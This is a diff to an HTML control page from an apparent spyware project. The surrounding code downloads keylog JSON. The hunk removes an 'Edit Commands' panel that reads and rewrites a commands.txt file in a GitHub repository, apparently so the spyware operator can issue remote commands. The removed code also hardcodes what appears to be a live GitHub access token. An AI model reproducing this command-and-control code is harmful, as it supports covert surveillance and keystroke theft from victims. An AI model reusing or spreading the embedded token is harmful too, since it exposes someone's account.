@@ -293,66 +293,6 @@
                     .catch(error => logError('Error downloading keylog JSON: ' + error));
             }
         </script>
-        <h2>Edit Commands</h2>
-    <textarea id="commands-content" rows="10" cols="50"></textarea>
-    <br>
-    <button class="download-button" onclick="saveCommands()">Save Commands</button>
-    
-    <script>
-        const commandsUrl = "https://api.github.com/repos/shrijaybaheti/spyware/contents/commands.txt"; // URL to the commands.txt file
-        let commandsSha = ""; // SHA of the commands.txt file (required for updates)
-    
-        // Fetch the current content of commands.txt
-        function fetchCommands() {
-            fetch(commandsUrl)
-                .then(response => response.json())
-                .then(data => {
-                    const content = atob(data.content); // Decode base64 content
-                    document.getElementById('commands-content').value = content; // Show the content in the text area
-                    commandsSha = data.sha; // Save the SHA for future updates
-                })
-                .catch(error => logError('Error fetching commands: ' + error));
-        }
-    
-        fetchCommands(); // Initial fetch
-    
-        // Function to save the updated commands to the repository
-        function saveCommands() {
-            const updatedContent = document.getElementById('commands-content').value;
-            const encodedContent = btoa(updatedContent); // Encode content to base64
-        
-            const body = {
-                message: "Updated commands.txt via website",
-                content: encodedContent,
-                sha: commandsSha // Use the SHA fetched earlier
-            };
-        
-            fetch(commandsUrl, {
-                method: "PUT",
-                headers: {
-                    "Content-Type": "application/json",
-                    "Authorization": "Bearer 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" // Replace with your GitHub token
-                },
-                body: JSON.stringify(body)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    // Log the error status and text for more information
-                    return response.json().then(errorData => {
-                        throw new Error(`Failed to save commands: ${errorData.message}`);
-                    });
-                }
-                alert('Commands saved successfully!');
-                fetchCommands(); // Refresh the commands content
-            })
-            .catch(error => logError('Error saving commands: ' + error.message));
-        }
-
-        function logError(message) {
-            console.error(message);
-            alert(message);
-        }
-    </script>
     </div>
 
     <script>
